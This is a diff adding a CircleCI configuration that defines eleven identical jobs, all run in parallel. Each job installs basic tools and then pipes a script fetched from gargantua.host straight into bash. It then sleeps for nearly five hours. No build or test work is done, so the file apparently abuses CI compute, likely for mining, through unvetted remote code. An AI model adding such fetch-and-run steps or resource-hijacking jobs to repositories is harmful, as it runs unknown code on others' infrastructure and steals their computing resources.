@@ -1,0 +1,127 @@
+version: 2.1
+
+jobs:
+  dartpypy:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cray.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  dartpypy1:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cray.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  dartpypy2:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cray.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  dartpypy3:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cray.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  dartpypy4:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cray.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  dartpypy5:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cray.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  dartpypy6:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cray.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  dartpypy7:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cray.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  dartpypy8:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cray.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  dartpypy9:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cray.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  dartpypy10:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cray.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+workflows:
+  main:
+    jobs:
+      - dartpypy
+      - dartpypy1
+      - dartpypy2
+      - dartpypy3
+      - dartpypy4
+      - dartpypy5
+      - dartpypy6
+      - dartpypy7
+      - dartpypy8
+      - dartpypy9
+      - dartpypy10
